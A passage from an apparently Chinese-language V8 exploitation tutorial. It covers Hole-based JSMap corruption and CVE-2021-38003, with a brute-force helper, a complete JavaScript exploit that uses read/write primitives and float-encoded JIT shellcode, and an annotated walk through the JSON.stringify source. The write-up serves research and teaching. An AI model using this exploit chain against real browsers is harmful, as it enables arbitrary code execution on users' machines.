class="title class_">OrderedHashMap</span>::kValueOffset));</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, bucket_entry,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span class="title class_">OrderedHashMap</span>::kChainOffset));</span><br></pre></td></tr></table></figure></div>
<p>因此 <code>Entry</code> 起始地址等同于 <code>&amp;bucket[-1]</code>，会将 <code>bucket count</code> 覆盖，也就是说我们能够控制 <code>number_of_buckets</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c566a42eab160a162872551db2cc1e6a.png"
                      alt="在这里插入图片描述"
                ><br>当我们拥有控制 <code>number_of_buckets</code> 的能力时，由于新的 <code>Entry</code> 的地址的计算方式是 <code>&amp;buckets + number_of_buckets + new_number_of_elements + new_number_of_deleted</code> ，因此我们可以溢出进行任意地址写。其中一个用法便是修改 <code>JSArray</code> 的 <code>length</code> 实现 OOB 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/eef097251127ec745ec4cc2e5270d715.png"
                      alt="在这里插入图片描述"
                ><br>之后的操作可以参考前面的沙箱逃逸。由于这个版本不容易泄露沙箱基地址，因此这里采用立即数写 shellcode 的方法。另外立即数写 shellcode 的 JIT 过程使得 Hole 的 JSMap 利用过程更加稳定。</p>
<p>另外需要注意的是 <code>JSMap</code> 的 <code>set</code> 操作时如果 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 不为 -1 ，则会在  <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 对应的单向链表中查找 <code>key</code> ，期间会检查链表中的 <code>Entry</code> 是否合法。为了避免出现这一情况，需要满足 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 。调试发现原来的 <code>buckets</code> 范围内的值为 -1 因此只需要满足 <code>ComputeUnseededHash(key) &amp; (buckets - 1) = 0</code> 并且 <code>key</code> 足够大（这里用 <code>key</code> 来覆盖 <code>JsArray</code> 的 <code>length</code>，否则会破坏 <code>JsArray</code> 的结构）。因此有如下爆破脚本。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ComputeUnseededHash</span><span class="params">(<span class="type">uint32_t</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> hash = key;</span><br><span class="line">    hash = ~hash + (hash &lt;&lt; <span class="number">15</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    hash = hash + (hash &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    hash = hash * <span class="number">2057</span>;</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">0x3fffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x300</span>, buckets = <span class="number">0x15</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="built_in">ComputeUnseededHash</span>(key) &amp; (buckets - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        key++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./d8 --allow-natives-syntax poc.js</span></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="CVE-2021-38003"><a href="#CVE-2021-38003" class="headerlink" title="CVE-2021-38003"></a>CVE-2021-38003</h2><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code><br>该漏洞是 <code>JSON.stringify()</code> 中存在触发溢出异常时没有设置 <code>pending_exception</code> 导致用户代码在 catch 异常时从 <code>pending_exception</code> 中取出默认填充值 <code>Hole</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title class_">Isolate</span>::<span class="title function_">clear_pending_exception</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">DCHECK</span>(!thread_local_top_.<span class="property">pending_exception_</span>-&gt;<span class="title class_">IsException</span>(<span class="variable language_">this</span>));</span><br><span class="line">  thread_local_top_.<span class="property">pending_exception_</span> = <span class="title class_">ReadOnlyRoots</span>(<span class="variable language_">this</span>).<span class="title function_">the_hole_value</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>JSON.stringify()</code> 方法是将一个 JavaScript 对象或值转换为 JSON 字符串，如果指定了一个 replacer 函数，则可以选择性地替换值，或者指定的 replacer 是数组，则可选择性地仅包含数组指定的属性。</p>
<p>该函数定义为 <code>JSON.stringify(value[, replacer [, space]])</code></p>
<ul>
<li><p><code>value</code><br>将要序列化成 一个 JSON 字符串的值。</p>
</li>
<li><p><code>replacer</code> （可选）<br>如果该参数是一个函数，则在序列化过程中，被序列化的值的每个属性都会经过该函数的转换和处理；如果该参数是一个数组，则只有包含在这个数组中的属性名才会被序列化到最终的 JSON 字符串中；如果该参数为 null 或者未提供，则对象所有的属性都会被序列化。</p>
</li>
<li><p><code>space</code> （可选）<br>指定缩进用的空白字符串，用于美化输出（pretty-print）；如果参数是个数字，它代表有多少的空格；上限为 10。该值若小于 1，则意味着没有空格；如果该参数为字符串（当字符串长度超过 10 个字母，取其前 10 个字母），该字符串将被作为空格；如果该参数没有提供（或者为 null），将没有空格。</p>
</li>
</ul>
<p>该函数返回值一个表示给定值的 JSON 字符串。</p>
<p>CVE-2021-38003 的 POC 如下，按照 POC 中调用 <code>JSON.stringify</code> 后的执行情况介绍 <code>JSON.stringify</code> 函数的具体流程。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(hole);</span><br></pre></td></tr></table></figure></div>

<p><code>JSON.stringify()</code> 在 V8 中的接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">JsonStringifier::Stringify</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; replacer,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; gap)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">InitializeReplacer</span>(replacer)) <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  <span class="keyword">if</span> (!gap-&gt;<span class="built_in">IsUndefined</span>(isolate_) &amp;&amp; !<span class="built_in">InitializeGap</span>(gap)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  &#125;</span><br><span class="line">  Result result = <span class="built_in">SerializeObject</span>(object);</span><br><span class="line">  <span class="keyword">if</span> (result == UNCHANGED) <span class="keyword">return</span> <span class="built_in">factory</span>()-&gt;<span class="built_in">undefined_value</span>();</span><br><span class="line">  <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">return</span> builder_.<span class="built_in">Finish</span>();</span><br><span class="line">  <span class="built_in">DCHECK</span>(result == EXCEPTION);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到 <code>Stringify</code> 在初始化完 <code>replacer</code> 和 <code>gap</code> 之后会调用核心函数 <code>SerializeObject</code> 之后对返回值进行检查，如果返回值为 <code>EXCEPTION</code> 说明触发异常。</p>
<p><code>SerializeObject</code> 函数实际是调用 <code>Serialize_</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Entry point to serialize the object.</span></span><br><span class="line"><span class="function">V8_INLINE Result <span class="title">SerializeObject</span><span class="params">(Handle&lt;Object&gt; obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(obj, <span class="literal">false</span>, <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Serialize_</code> 函数中是一个很大的 switch ，对于 <code>obj</code> 中的元素的类型调用不同的序列化方法。根据 POC 的情况，这里调用 <code>SerializeJSArray</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="type">bool</span> deferred_string_key&gt;</span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::Serialize_</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="type">bool</span> comma,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    Handle&lt;Object&gt; key)</span> </span>&#123; </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">switch</span> (HeapObject::<span class="built_in">cast</span>(*object).<span class="built_in">map</span>().<span class="built_in">instance_type</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> JS_ARRAY_TYPE:</span><br><span class="line">      <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">SerializeJSArray</span>(Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(object), key);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SerializeJSArray</code> 函数的相关内容如下。在 POC 中数组 <code>b</code> 的每个元素均是数组 <code>a</code>，其类型是 <code>PACKED_ELEMENTS</code> 因此会调用 <code>SerializeElement</code> 处理，而 <code>SerializeElement</code> 会调用 <code>Serialize_</code> 递归进行处理。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// Serialize an array element.</span></span><br><span class="line">  <span class="comment">// The index may serve as argument for the toJSON function.</span></span><br><span class="line">  <span class="function">V8_INLINE Result <span class="title">SerializeElement</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(object, <span class="literal">false</span>,</span><br><span class="line">                             <span class="built_in">Handle</span>&lt;Object&gt;(Smi::<span class="built_in">FromInt</span>(i), isolate));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeJSArray</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSArray&gt; object, Handle&lt;Object&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate_)</span></span>;</span><br><span class="line">  Result stack_push = <span class="built_in">StackPush</span>(object, key);</span><br><span class="line">  <span class="keyword">if</span> (stack_push != SUCCESS) <span class="keyword">return</span> stack_push;</span><br><span class="line">  <span class="type">uint32_t</span> length = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">CHECK</span>(object-&gt;<span class="built_in">length</span>().<span class="built_in">ToArrayLength</span>(&amp;length));</span><br><span class="line">  <span class="built_in">DCHECK</span>(!object-&gt;<span class="built_in">IsAccessCheckNeeded</span>());</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">Indent</span>();</span><br><span class="line">  <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (replacer_function_.<span class="built_in">is_null</span>()) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (object-&gt;<span class="built_in">GetElementsKind</span>()) &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">case</span> PACKED_ELEMENTS: &#123;</span><br><span class="line">        <span class="function">Handle&lt;Object&gt; <span class="title">old_length</span><span class="params">(object-&gt;length(), isolate_)</span></span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">          <span class="keyword">if</span> (object-&gt;<span class="built_in">length</span>() != *old_length ||</span><br><span class="line">              object-&gt;<span class="built_in">GetElementsKind</span>() != PACKED_ELEMENTS) &#123;</span><br><span class="line">            <span class="comment">// Fall back to slow path.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">          Result result = <span class="built_in">SerializeElement</span>(</span><br><span class="line">              isolate_,</span><br><span class="line">              <span class="built_in">Handle</span>&lt;Object&gt;(FixedArray::<span class="built_in">cast</span>(object-&gt;<span class="built_in">elements</span>()).<span class="built_in">get</span>(i),</span><br><span class="line">                             isolate_),</span><br><span class="line">              i);</span><br><span class="line">          <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">            builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result != SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// The FAST_HOLEY_* cases could be handled in a faster way. They resemble</span></span><br><span class="line">      <span class="comment">// the non-holey cases except that a lookup is necessary for holes.</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; length) &#123;</span><br><span class="line">    <span class="comment">// Slow path for non-fast elements and fall-back in edge case.</span></span><br><span class="line">    Result result = <span class="built_in">SerializeArrayLikeSlow</span>(object, i, length);</span><br><span class="line">    <span class="keyword">if</span> (result != SUCCESS) <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Unindent</span>();</span><br><span class="line">  <span class="keyword">if</span> (length &gt; <span class="number">0</span>) <span class="built_in">NewLine</span>();</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">  <span class="built_in">StackPop</span>();</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>数组 a 的成元是基本类型字符串，所以在 <code>SerializeJSArray</code> 方法不会再进入递归，而是调用 <code>SerializeArrayLikeSlow</code> 进行下一步操作</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint32_t</span> i = start; i &lt; length; i++) &#123;</span><br><span class="line">    <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">    Handle&lt;Object&gt; element;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(</span><br><span class="line">        isolate_, element, JSReceiver::<span class="built_in">GetElement</span>(isolate_, object, i),</span><br><span class="line">        EXCEPTION);</span><br><span class="line">    Result result = <span class="built_in">SerializeElement</span>(isolate_, element, i);</span><br><span class="line">    <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">      <span class="comment">// Detect overflow sooner for large sparse arrays.</span></span><br><span class="line">      <span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">      builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里调用的 <code>SerializeElement</code> 会再次调用 <code>Serialize_</code> 只不过由于这次传入的是字符串，因此会调用 <code>SerializeString</code> 并最终调用 <code>SerializeString_</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString</span><span class="params">(Handle&lt;String&gt; object)</span> </span>&#123;</span><br><span class="line">  object = String::<span class="built_in">Flatten</span>(isolate_, object);</span><br><span class="line">  <span class="keyword">if</span> (builder_.<span class="built_in">CurrentEncoding</span>() == String::ONE_BYTE_ENCODING) &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, <span class="type">uint8_t</span>&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      builder_.<span class="built_in">ChangeEncoding</span>();</span><br><span class="line">      <span class="built_in">SerializeString</span>(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, base::uc16&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;base::uc16, base::uc16&gt;(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> (object-&gt;<span class="built_in">IsString</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">        <span class="built_in">SerializeString</span>(Handle&lt;String&gt;::<span class="built_in">cast</span>(object));</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SerializeString_</code> 本质就是把字符 <code>Append</code> 到 <code>builder_</code> 中。</p>
